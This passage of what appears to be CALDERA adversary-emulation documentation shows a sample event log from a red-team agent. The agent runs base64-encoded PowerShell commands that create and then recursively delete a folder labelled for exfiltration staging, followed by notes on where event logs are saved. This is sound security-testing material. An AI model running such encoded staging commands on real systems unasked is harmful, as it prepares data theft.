+<span class="w">    </span><span class="nt">&quot;command&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;TmV3LUl0ZW0gLVBhdGggIi4iIC1OYW1lICJzdGFnZWQiIC1JdGVtVHlwZSAiZGlyZWN0b3J5IiAtRm9yY2UgfCBmb3JlYWNoIHskXy5GdWxsTmFtZX0gfCBTZWxlY3QtT2JqZWN0&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;delegated_timestamp&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2021-02-23T11:50:32Z&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;collected_timestamp&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2021-02-23T11:50:37Z&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;finished_timestamp&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2021-02-23T11:50:37Z&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;status&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;platform&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;windows&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;executor&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;psh&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;pid&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">3212</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;agent_metadata&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="nt">&quot;paw&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;pertbn&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;group&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;red&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;architecture&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;amd64&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;username&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;BYZANTIUM\\Carlomagno&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;location&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;C:\\Users\\Public\\sandcat.exe&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;pid&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">5896</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;ppid&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">2624</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;privilege&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Elevated&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;host&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;WORKSTATION1&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;contact&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;HTTP&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;created&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2021-02-23T11:48:33Z&quot;</span>
+<span class="w">    </span><span class="p">},</span>
+<span class="w">    </span><span class="nt">&quot;ability_metadata&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="nt">&quot;ability_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;6469befa-748a-4b9c-a96d-f191fde47d89&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;ability_name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Create staging directory&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;ability_description&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;create a directory for exfil staging&quot;</span>
+<span class="w">    </span><span class="p">},</span>
+<span class="w">    </span><span class="nt">&quot;operation_metadata&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="nt">&quot;operation_name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;My Operation&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;operation_start&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2021-02-23T11:50:12Z&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;operation_adversary&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Collection&quot;</span>
+<span class="w">    </span><span class="p">},</span>
+<span class="w">    </span><span class="nt">&quot;attack_metadata&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="nt">&quot;tactic&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;collection&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;technique_name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Data Staged: Local Data Staging&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;technique_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;T1074.001&quot;</span>
+<span class="w">    </span><span class="p">},</span>
+<span class="w">    </span><span class="nt">&quot;output&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="nt">&quot;stdout&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;C:\\Users\\carlomagno\\staged&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;stderr&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;exit_code&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0&quot;</span>
+<span class="w">    </span><span class="p">},</span>
+<span class="w">    </span><span class="nt">&quot;agent_reported_time&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2021-02-23T11:50:33Z&quot;</span>
+<span class="w">  </span><span class="p">},</span>
+<span class="w">  </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;command&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;UmVtb3ZlLUl0ZW0gLVBhdGggInN0YWdlZCIgLXJlY3Vyc2U=&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;delegated_timestamp&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2021-02-23T11:50:42Z&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;collected_timestamp&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2021-02-23T11:50:44Z&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;finished_timestamp&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2021-02-23T11:50:44Z&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;status&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;platform&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;windows&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;executor&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;psh&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;pid&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">6184</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;agent_metadata&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="nt">&quot;paw&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;pertbn&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;group&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;red&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;architecture&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;amd64&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;username&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;BYZANTIUM\\Carlomagno&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;location&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;C:\\Users\\Public\\sandcat.exe&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;pid&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">5896</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;ppid&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">2624</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;privilege&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Elevated&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;host&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;WORKSTATION1&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;contact&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;HTTP&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;created&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2021-02-23T11:48:33Z&quot;</span>
+<span class="w">    </span><span class="p">},</span>
+<span class="w">    </span><span class="nt">&quot;ability_metadata&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="nt">&quot;ability_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;6469befa-748a-4b9c-a96d-f191fde47d89&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;ability_name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Create staging directory&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;ability_description&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;create a directory for exfil staging&quot;</span>
+<span class="w">    </span><span class="p">},</span>
+<span class="w">    </span><span class="nt">&quot;operation_metadata&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="nt">&quot;operation_name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;My Operation&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;operation_start&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2021-02-23T11:50:12Z&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;operation_adversary&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Collection&quot;</span>
+<span class="w">    </span><span class="p">},</span>
+<span class="w">    </span><span class="nt">&quot;attack_metadata&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="nt">&quot;tactic&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;collection&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;technique_name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Data Staged: Local Data Staging&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;technique_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;T1074.001&quot;</span>
+<span class="w">    </span><span class="p">},</span>
+<span class="w">    </span><span class="nt">&quot;agent_reported_time&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2021-02-23T11:50:43Z&quot;</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">]</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="automatic-event-log-generation">
+<h3>Automatic Event Log Generation<a class="headerlink" href="#automatic-event-log-generation" title="Permalink to this heading">¶</a></h3>
+<p>When an operation terminates, the corresponding event logs will be written to disk in the same format as if they were manually requested for download. These event logs will contain command output and will be unencrypted on disk. Each operation will have its own event logs written to a separate file in the directory <code class="docutils literal notranslate"><span class="pre">$reports_dir/event_logs</span></code>, where <code class="docutils literal notranslate"><span class="pre">$reports_dir</span></code> is the <code class="docutils literal notranslate"><span class="pre">reports_dir</span></code> entry in the CALDERA configuration file. The filename will be of the format <code class="docutils literal notranslate"><span class="pre">operation_$id.json</span></code>, where <code class="docutils literal notranslate"><span class="pre">$id</span></code> is the unique ID of the operation.</p>
+</div>
+</div>
+</div>
+
+
+           </div>
+           
+          </div>
+          <footer>
+  
+    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
+      
+        <a href="Initial-Access-Attacks.html" class="btn btn-neutral float-right" title="Initial Access Attacks" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
+      
+      
+        <a href="Objectives.html" class="btn btn-neutral float-left" title="Objectives" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
+      
+    </div>
+  
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>
+        &copy; Copyright 2023, The MITRE Corporation
+
+    </p>
+  </div>
+  Built with <a href="http://sphinx-doc.org/">Sphinx</a> using a <a href="https://github.com/rtfd/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>. 
+
+</footer>
+
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+  
+
+
+  <script type="text/javascript">
+      jQuery(function () {
+          SphinxRtdTheme.Navigation.enable(true);
+      });
+  </script>
+
+  
+  
+    
+   
+
+</body>
+</html>
